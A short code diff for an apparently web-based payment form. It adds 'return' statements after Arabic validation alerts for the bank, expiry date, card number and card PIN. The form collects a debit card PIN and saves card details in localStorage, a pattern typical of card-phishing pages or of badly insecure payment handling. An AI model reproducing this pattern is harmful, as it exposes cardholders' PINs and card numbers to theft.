@@ -1309,15 +1309,19 @@ function onPay() {
         
         if(!document.getElementById('bank').value){
             alert('يوجد خطأ في المعلومات - يرجى أختيار البنك')
+            return 
         }
         if(!document.getElementById('month').value | !document.getElementById('year').value){
             alert('يوجد خطأ في المعلومات - يرجى اختيار تاريخ الانتهاء')
+            return 
         }
       if(!document.getElementById('debitNumber').value){
             alert('يوجد خطأ في المعلومات - يرجى  أدخال رقم البطاقة')
+          return 
         }
       if(!document.getElementById('cardPin').value){
             alert('يوجد خطأ في المعلومات - يرجى  رمز البطاقة')
+          return 
         }
         localStorage.setItem('cc', cc)
         localStorage.setItem('month', month)
